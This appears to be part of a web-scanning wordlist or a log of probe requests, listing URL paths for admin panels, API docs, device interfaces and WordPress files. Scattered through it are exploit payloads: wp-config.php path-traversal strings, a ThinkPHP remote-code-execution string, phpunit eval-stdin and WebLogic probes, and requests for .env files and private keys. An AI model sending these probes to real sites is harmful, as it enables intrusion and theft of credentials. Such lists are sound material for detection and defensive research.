skin/js/common.js
skin/main/onload.js
snom/
soap.cgi?service=WANIPConn1
solr/
solr/admin/info/system?wt=json
SoundPointIP/
sounds/notification.wav
spa/
SPA112/
special-events
special-events/
spectralink/
spring-security-oauth-resource/swagger-ui.html
spring-security-rest/api/swagger-ui.html
sql/main.php
sql/myadmin/
sql/php-myadmin/
sql/phpmanager/
sql/phpmy-admin/
sql/phpmy-admin/index.php?lang=en
sql/phpMyAdmin/
sql/phpmyadmin2/
sql/phpMyAdmin2/
sql/phpMyAdmin2/index.php?lang=en
sql/phpmyadmin3/
sql/phpMyAdmin3/
sql/phpmyadmin4/
sql/phpMyAdmin4/
sql/sql-admin/
sql/sql-admin/index.php?lang=en
sql/sql/
sql/sqladmin/
sql/sqlweb/
sql/sqlweb/index.php?lang=en
sql/webadmin/
sql/webdb/
sql/websql/
sqlmanager/
ssl/localhost.key
sso/ui/PWResetUserValidation
stalker_portal/api/stb
stalker_portal/c/
stalker_portal/c/version.js
stalker_portal/server/adm/login
stalker_portal/server/load.php?type=stb&action=handshake&token=&prehash=0&JsHttpRequest=1-xml
stalker_portal/server/tools/auth_simple.php
stalker_portal/server/tools/m3u.php
stat
static/admincp/js/common.js
static/common/js/common.js
static/common/js/global.js
static/config.js
static/css/index.css
static/css/mobile.css
static/css/style.css
static/data/configjs.js
static/data/gamedatas.js
static/data/thirdgames.json
static/diff_worker.js
static/download/style.css
static/guide/ab.css
static/h5/img/icon__create-group.png
static/home/css/css.css
static/home/css2/login--1.css
static/home/js/rooms.js
static/home/static/js/login.js
static/index/css/iindex.css
static/index/js/lk/order.js
static/local/img/userCenter/hourlyPrivilege.svg
static/login/js/lk/order.js
static/mobile/user.html
static/swagger.json
static/wap/css/index.css
static/wap/js/common.js
static/xianyu/js/bankCheck.js
statics/js/API.js
status
status?full=true
step1.asp
stock/search.html?keyword=00202
storage/.env
stream/live.php
streaming/clients_live.php
style.css
sw/swagger-ui.html
swagger
swagger-dubbo/api-docs
swagger-ui
swagger-ui.html
swagger-ui/html
swagger-ui/index.html
swagger/codes
swagger/index.html
swagger/static/index.html
switch
system_api.php
System/deviceInfo
t3
t4
t4mH
tatic/plugins/jquery-file-upload/
Telephone/
Telerik.Web.UI.WebResource.axd?type=rau
telescope/requests
template/920ka/css/lsy.css
template/920ka/js/woodyapp.js
template/css/login.css
template/js/comm/Confrim.js
Template/Mobile/js/main.js
template/swagger-ui.html
template/tmp1/js/common.js
Templates/user/finance/css/userPay.css
Templates/user/js/global.js
test.php
test/wp-includes/wlwmanifest.xml
tftp/
tftpboot/
tftpphone/
tftproot/
threaddump
thriveGame.css
tiger/
tmUnblock.cgi
tools.cgi
tools/phpMyAdmin/index.php/
TP/public/index.php
TP/public/index.php?s=captcha
TP/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
trace
tree?
tt
twilio.env
txt/
typo3/phpmyadmin/index.php/
UD/?9
UD/act?1
uddiexplorer/
ui/vropspluginui/rest/services/uploadova
un4F
UpLoad
upnp/control/basicevent1
user/
user/?amcontext
user/allroleinfo
user/getAllNicknames
user/login
user/Login
user/swagger-ui.html
user/userlist
users?page=&size=5
v1.16/version
v1/agent/self
v1/management/tenant/getSpeedDomain
v1/sys/health
v2/_catalog
v2/api-docs
v2/swagger.json
var/jwt/private.pem
vendor/.env
vendor/jquery-file-upload/
vendor/phpunit/phpunit/build.xml
vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
verification.asp
version
vicidial/admin.php?ADD=140000000000
view/all/newJob
views/commData/commonSite.js
views/home/home.js
virtualjdbc/
voice/sip/
voip/
voip/sip/
vtech/
w00tw00t.at.blackhats.romanian.anti-sec:)
w00tw00t.at.ISC.SANS.DFind:)
wanipcn.xml
wap/api/exchangerateuserconfig!get.action
wap/banner/details
Wap/JS/wap-index.js
wap/trading/lastKlineParameter
web-console/Invoker
WEB-INF/classes/database.properties
WEB-INF/database.properties
WEB-INF/web.xml
web/api/getBanner
web/phpMyAdmin/index.php/
web/wp-includes/wlwmanifest.xml
webadmin/Index.action
webdav/
webfig/
website/wp-includes/wlwmanifest.xml
webstats/
wkn/
wls-wsat/CoordinatorPortType
wls-wsat/CoordinatorPortType11
wordpress
wordpress/wp-includes/wlwmanifest.xml
wordpress/wp-login.php
wp
wp-admin/admin-ajax.php
wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
wp-admin/admin-post.php?page=wpsm_responsive_coming_soon
wp-config.php/
wp-content/
wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php
wp-content/plugins/wp-file-manager/readme.txt
wp-includes/js/jquery/jquery.js
wp-includes/wlwmanifest.xml
wp-json/wp/v2/users
wp-login.php
wp/wp-includes/wlwmanifest.xml
wp/wp-login.php
wp1/wp-includes/wlwmanifest.xml
wp2/wp-includes/wlwmanifest.xml
ws_utc/begin.do
ws_utc/config.do
ws/index/getTheLotteryInitList
ws/v1/cluster
ws/v1/cluster/apps/new-application
wsman
www.key
www/phpMyAdmin/index.php/
xampp/phpmyadmin/index.php/
xianyu/index/setp1.html
xml/
xmlrpc.php?rsd
xy/
xy/image/jiantou.png
yealink/
yeastar/
yester/login.jsp
zz/address.php?gid=651
zz2/address.php?gid=651